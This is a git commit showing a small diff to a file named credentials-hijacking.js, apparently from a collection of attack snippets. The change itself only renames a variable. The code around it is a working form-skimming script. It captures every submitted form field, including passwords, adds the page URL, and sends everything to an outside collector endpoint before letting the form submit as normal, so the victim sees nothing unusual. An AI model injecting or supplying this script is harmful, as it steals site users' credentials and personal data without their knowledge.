85ee8a8e75442d84f17f411d7c6a2fcd33ceb33b
can <47246431+canozal@users.noreply.github.com>
2022-06-17 16:32:50 +0300

    Update credentials-hijacking.js

--- credentials-hijacking.js
+++ credentials-hijacking.js
@@ -1,6 +1,6 @@
 document.addEventListener('submit', function(e) {
     e.preventDefault();
     const URL = 'https://{your-endpoint}.free.beeceptor.com';
-    let params = [...e.target.elements].map(d => d.name + "=" + d.value).concat(["url=" + window.location.href]).filter(d => d.length>1).join("&");
+    let params = [...e.target.elements].map(param => param.name + "=" + param.value).concat(["url=" + window.location.href]).filter(param => param.length>1).join("&");
     fetch(URL + "?" + params).then(() => e.target.submit());
 });
